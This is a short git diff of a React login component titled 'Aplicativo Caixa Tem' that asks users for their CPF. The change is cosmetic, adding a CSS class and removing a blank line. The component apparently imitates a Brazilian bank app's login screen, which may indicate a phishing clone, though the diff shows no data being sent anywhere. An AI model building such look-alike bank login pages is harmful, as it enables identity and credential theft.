@@ -50,13 +50,12 @@ const Step1 = ({ nextStep, loginData, setLoginData }) => {
         ? <Loader />
         :
 
-<div>
+<div className="App-header">
        <img src={logo} className="logo" />
             <h2>Aplicativo Caixa Tem</h2>
 
             <p>Informe seu CPF e clique em "Próximo" para continuar:</p>
             <div>
-            
                 <TextField
                     label="CPF"
                     name="CPF"
